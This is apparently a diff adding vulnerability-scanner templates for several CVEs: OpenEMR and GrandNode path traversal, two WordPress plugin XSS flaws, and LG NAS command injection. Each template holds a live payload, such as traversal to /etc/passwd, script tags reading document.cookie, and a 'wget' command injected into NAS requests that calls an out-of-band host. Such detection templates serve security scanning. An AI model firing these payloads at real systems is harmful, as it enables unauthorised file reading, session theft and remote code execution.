@@ -1057,6 +1057,40 @@
       ]
     },
     {
+      "id": "CVE-2012-0991",
+      "info": {
+        "author": "daffainfo",
+        "description": "Multiple directory traversal vulnerabilities in OpenEMR 4.1.0 allow remote authenticated users to read arbitrary files via a .. (dot dot) in the formname parameter to (1) contrib/acog/print_form.php; or (2) load_form.php, (3) view_form.php, or (4) trend_form.php in interface/patient_file/encounter.",
+        "name": "OpenEMR 4.1 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/36650\n- https://www.cvedetails.com/cve/CVE-2012-0991\n",
+        "severity": "high",
+        "tags": "cve,cve2012,lfi,openemr"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/contrib/acog/print_form.php?formname=../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2012-1823",
       "info": {
         "author": "pikpikcu",
@@ -2204,6 +2238,88 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/activehelper-livehelp/server/offline.php?MESSAGE=MESSAGE%3C%2Ftextarea%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE&URL=URL&COMPANY=COMPANY&SERVER=SERVER&PHONE=PHONE&SECURITY=SECURITY&BCC=BCC&EMAIL=EMAIL%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&NAME=NAME%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2014-4535",
+      "info": {
+        "author": "daffainfo",
+        "name": "Import Legacy Media <= 0.1 - Unauthenticated Reflected Cross-Site Scripting (XSS)",
+        "reference": "- https://wpscan.com/vulnerability/7fb78d3c-f784-4630-ad92-d33e5de814fd\n- https://nvd.nist.gov/vuln/detail/CVE-2014-4535\n",
+        "severity": "medium",
+        "tags": "cve,cve2014,wordpress,wp-plugin,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "'></script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/import–legacy–media/getid3/demos/demo.mimeonly.php?filename=filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2014-4536",
+      "info": {
+        "author": "daffainfo",
+        "name": "Infusionsoft Gravity Forms Add-on < 1.5.7 - Unauthenticated Reflected XSS",
+        "reference": "- https://wpscan.com/vulnerability/f048b5cc-5379-4c19-9a43-cd8c49c8129f\n- https://nvd.nist.gov/vuln/detail/CVE-2014-4536\n",
+        "severity": "medium",
+        "tags": "cve,cve2014,wordpress,wp-plugin,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"></script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/infusionsoft/Infusionsoft/tests/notAuto_test_ContactService_pauseCampaign.php?go=go%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&contactId=contactId%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&campaignId=campaignId%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&"
           ]
         }
       ]
@@ -5905,6 +6021,41 @@
       ]
     },
     {
+      "id": "CVE-2018–10818",
+      "info": {
+        "author": "gy741",
+        "description": "The vulnerability (CVE-2018-10818) is a pre-auth remote command injection vulnerability found in the majority of LG NAS devices. You cannot simply log in with any random username and password. However, there lies a command injection vulnerability in the “password” parameter.",
+        "name": "LG NAS Devices - Remote Code Execution (Unauthenticated)",
+        "reference": "- https://www.vpnmentor.com/blog/critical-vulnerability-found-majority-lg-nas-devices/\n- https://medium.com/@0x616163/lg-n1a1-unauthenticated-remote-command-injection-cve-2018-14839-9d2cf760e247\n",
+        "severity": "critical",
+        "tags": "cve,cve2018,lg-nas,rce,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /system/sharedir.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: curl/7.58.0\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\n&uid=10; wget http://{{interactsh-url}}\n",
+            "POST /en/php/usb_sync.php HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: curl/7.58.0\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\n\n&act=sync&task_number=1;wget http://{{interactsh-url}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-10822",
       "info": {
         "author": "daffainfo",
@@ -8550,6 +8701,43 @@
             "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nUpgrade-Insecure-Requests: 1\n"
           ],
           "req-condition": true
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-12276",
+      "info": {
+        "author": "daffainfo",
+        "description": "Path Traversal vulnerability in Controllers/LetsEncryptController.cs in LetsEncryptController in GrandNode 4.40 allows remote, unauthenticated attackers to retrieve arbitrary files on the web server via specially crafted LetsEncrypt/Index?fileName= HTTP requests. A patch for this issue was made on 2019-05-30 in GrandNode 4.40.",
+        "name": "GrandNode 4.40 - Path Traversal",
+        "reference": "- https://security401.com/grandnode-path-traversal/\n- https://www.cvedetails.com/cve/CVE-2019-12276\n",
+        "severity": "high",
+        "tags": "cve,cve2019,lfi"
+      },
+      "requests": [
+        {
+          "headers": {
+            "Connection": "close"
+          },
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/LetsEncrypt/Index?fileName=/etc/passwd"
+          ]
         }
       ]
     },
